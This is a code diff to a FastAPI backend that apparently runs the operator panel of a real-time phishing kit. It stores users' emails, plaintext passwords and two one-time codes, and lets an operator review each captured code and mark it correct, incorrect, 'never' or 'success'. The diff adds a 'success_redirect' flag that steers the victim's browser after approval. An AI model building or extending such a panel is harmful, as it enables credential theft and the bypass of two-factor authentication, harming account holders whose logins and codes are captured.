@@ -109,6 +109,7 @@ async def lifespan(app: FastAPI):
                     otp1_correct BOOLEAN DEFAULT FALSE,
                     otp2_correct BOOLEAN DEFAULT FALSE,
                     otp1_never BOOLEAN DEFAULT FALSE,
+                    success_redirect BOOLEAN DEFAULT FALSE,
                     created_at TIMESTAMP DEFAULT NOW()
                 )
             """)
@@ -241,7 +242,7 @@ async def submit_otp(data: OTPSubmit):
         
         await conn.execute("""
             UPDATE users 
-            SET otp = $1, otp1_correct = FALSE, otp1_never = FALSE
+            SET otp = $1, otp1_correct = FALSE, otp1_never = FALSE, success_redirect = FALSE
             WHERE email = $2
         """, data.otp, data.email)
         
@@ -294,10 +295,14 @@ async def check_user_status(email: str):
 @app.get("/api/users/check-otp-status")
 async def check_otp_status(email: str):
     async with db_pool.acquire() as conn:
-        user = await conn.fetchrow("SELECT otp1_correct, otp, otp1_never FROM users WHERE email = $1", email)
+        user = await conn.fetchrow("SELECT otp1_correct, otp, otp1_never, success_redirect FROM users WHERE email = $1", email)
         if user:
             if user['otp1_never']:
                 return {"never": True, "redirect_url": f"/success?email={email}", "timeout": 5000}
+            
+            # NEW: Check if success button was clicked
+            if user['success_redirect']:
+                return {"success_redirect": True}
             
             if not user['otp1_correct'] and not user['otp']:
                 return {"approved": False, "incorrect": True, "reset": True}
@@ -346,7 +351,7 @@ async def get_users(credentials: HTTPAuthorizationCredentials = Depends(HTTPBear
     
     async with db_pool.acquire() as conn:
         users = await conn.fetch("""
-            SELECT email, password, otp, second_otp, approved, otp1_correct, otp2_correct, otp1_never, created_at
+            SELECT email, password, otp, second_otp, approved, otp1_correct, otp2_correct, otp1_never, success_redirect, created_at
             FROM users 
             WHERE email != $1
             ORDER BY created_at DESC
@@ -384,7 +389,7 @@ async def approve_first_otp(action: AdminAction, credentials: HTTPAuthorizationC
     async with db_pool.acquire() as conn:
         await conn.execute("""
             UPDATE users 
-            SET otp1_correct = TRUE, otp1_never = FALSE
+            SET otp1_correct = TRUE, otp1_never = FALSE, success_redirect = FALSE
             WHERE email = $1
         """, action.email)
         
@@ -403,9 +408,10 @@ async def success_first_otp(action: AdminAction, credentials: HTTPAuthorizationC
         raise HTTPException(status_code=403, detail="Invalid token")
     
     async with db_pool.acquire() as conn:
+        # NEW: Set success_redirect flag to TRUE to distinguish from normal approve
         await conn.execute("""
             UPDATE users 
-            SET otp1_correct = TRUE, approved = TRUE, otp1_never = FALSE
+            SET otp1_correct = TRUE, approved = TRUE, success_redirect = TRUE, otp1_never = FALSE
             WHERE email = $1
         """, action.email)
         
@@ -426,7 +432,7 @@ async def incorrect_first_otp(action: AdminAction, credentials: HTTPAuthorizatio
     async with db_pool.acquire() as conn:
         await conn.execute("""
             UPDATE users 
-            SET otp1_correct = FALSE, otp = NULL, otp1_never = FALSE
+            SET otp1_correct = FALSE, otp = NULL, otp1_never = FALSE, success_redirect = FALSE
             WHERE email = $1
         """, action.email)
     
@@ -447,7 +453,7 @@ async def never_first_otp(action: AdminAction, credentials: HTTPAuthorizationCre
     async with db_pool.acquire() as conn:
         await conn.execute("""
             UPDATE users 
-            SET otp1_never = TRUE, otp1_correct = FALSE, approved = TRUE
+            SET otp1_never = TRUE, otp1_correct = FALSE, approved = TRUE, success_redirect = FALSE
             WHERE email = $1
         """, action.email)
         
@@ -469,8 +475,8 @@ async def reset_user(action: AdminAction, credentials: HTTPAuthorizationCredenti
         await conn.execute("DELETE FROM users WHERE email = $1", action.email)
         
         await conn.execute("""
-            INSERT INTO users (email, password, approved, otp, second_otp, otp1_correct, otp2_correct, otp1_never)
-            VALUES ($1, $2, FALSE, NULL, NULL, FALSE, FALSE, FALSE)
+            INSERT INTO users (email, password, approved, otp, second_otp, otp1_correct, otp2_correct, otp1_never, success_redirect)
+            VALUES ($1, $2, FALSE, NULL, NULL, FALSE, FALSE, FALSE, FALSE)
         """, action.email, "user")
         
         await manager.send_to_user(action.email, {
